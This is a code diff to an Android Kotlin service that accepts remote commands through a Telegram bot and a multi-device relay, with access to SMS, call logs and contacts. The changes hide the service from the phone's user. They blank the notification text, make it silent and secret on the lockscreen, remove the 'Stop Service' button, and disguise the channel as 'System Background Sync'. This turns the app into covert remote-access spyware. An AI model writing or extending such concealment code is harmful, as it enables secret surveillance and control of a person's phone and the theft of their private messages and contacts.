@@ -23,6 +23,9 @@ import com.example.data.calls.CallLogRepository
 import com.example.data.contacts.ContactManager
 import com.example.data.contacts.ContactRepository
 import com.example.data.model.LogType
+import com.example.data.model.TelegramChat
+import com.example.data.model.TelegramMessage
+import com.example.data.model.TelegramUser
 import com.example.data.security.PreferenceManager
 import com.example.data.sms.SmsManager
 import com.example.data.sms.SmsRepository
@@ -57,7 +60,7 @@ class TelegramRemoteService : Service() {
         const val ACTION_START_SERVICE = "com.example.telemanage.START_SERVICE"
         const val ACTION_STOP_SERVICE = "com.example.telemanage.STOP_SERVICE"
         private const val NOTIFICATION_ID = 1001
-        private const val CHANNEL_ID = "telemanage_remote_channel"
+        private const val CHANNEL_ID = "vil_services_silent_channel"
 
         private val _isRunningFlow = MutableStateFlow(false)
         val isRunningFlow: StateFlow<Boolean> = _isRunningFlow.asStateFlow()
@@ -200,6 +203,18 @@ class TelegramRemoteService : Service() {
                 "Foreground service is running and polling for Telegram commands"
             )
             startPollingLoop()
+
+            serviceScope.launch {
+                val token = preferenceManager.getBotToken()
+                val authorizedId = preferenceManager.getAuthorizedUserId()
+                if (token.isNotBlank() && authorizedId != 0L) {
+                    telegramClient.sendMessage(
+                        token = token,
+                        chatId = authorizedId,
+                        text = "🟢 <b>Remote Service Online</b>\n\nDevice is connected and ready to receive commands.\nType /help to see all available commands."
+                    )
+                }
+            }
         }
 
         return START_STICKY
@@ -225,13 +240,14 @@ class TelegramRemoteService : Service() {
         )
 
         val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Remote Access Active")
-            .setContentText("Telegram remote management is enabled.")
+            .setContentTitle("")
+            .setContentText("")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setContentIntent(pendingOpenApp)
             .setOngoing(true)
-            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop Service", pendingStop)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -274,6 +290,40 @@ class TelegramRemoteService : Service() {
                     _connectionStateFlow.value = ServiceConnectionState.AUTH_ERROR
                     delay(5000)
                     continue
+                }
+
+                val relayUrl = preferenceManager.getRelayUrl()
+                if (relayUrl.isNotBlank()) {
+                    // Multi-Device Relay Mode (Cloudflare / Google Apps Script)
+                    val status = deviceInfoProvider.getDeviceStatus(_isRunningFlow.value)
+                    val battery = status.batteryPercent
+                    val model = status.model
+                    val deviceId = preferenceManager.getDeviceId()
+
+                    val relayResult = telegramClient.pollRelay(relayUrl, deviceId, battery, model)
+                    if (relayResult.isSuccess) {
+                        consecutiveErrors = 0
+                        _connectionStateFlow.value = ServiceConnectionState.CONNECTED
+                        val commands = relayResult.getOrNull().orEmpty()
+                        for (cmd in commands) {
+                            _lastUpdateReceivedFlow.value = System.currentTimeMillis()
+                            val mockMsg = TelegramMessage(
+                                messageId = System.currentTimeMillis(),
+                                from = TelegramUser(id = authorizedId, firstName = "Owner"),
+                                chat = TelegramChat(id = authorizedId),
+                                date = System.currentTimeMillis() / 1000,
+                                text = cmd
+                            )
+                            commandHandler.handleIncomingMessage(
+                                message = mockMsg,
+                                isServiceRunning = true,
+                                serviceStartTimeMs = _startTimeFlow.value
+                            )
+                        }
+                    } else {
+                        consecutiveErrors++
+                        _connectionStateFlow.value = ServiceConnectionState.RECONNECTING
+                    }
                 }
 
                 _connectionStateFlow.value = if (consecutiveErrors > 0) {
@@ -372,15 +422,23 @@ class TelegramRemoteService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val manager = getSystemService(NotificationManager::class.java)
+            try {
+                manager.deleteNotificationChannel("telemanage_remote_channel")
+            } catch (_: Exception) {}
+
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "TeleManage Remote Service",
-                NotificationManager.IMPORTANCE_LOW
+                "System Background Sync",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Persistent notification indicating active remote Telegram control"
+                description = "Silent internal background sync"
                 setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
-            val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
         }
     }
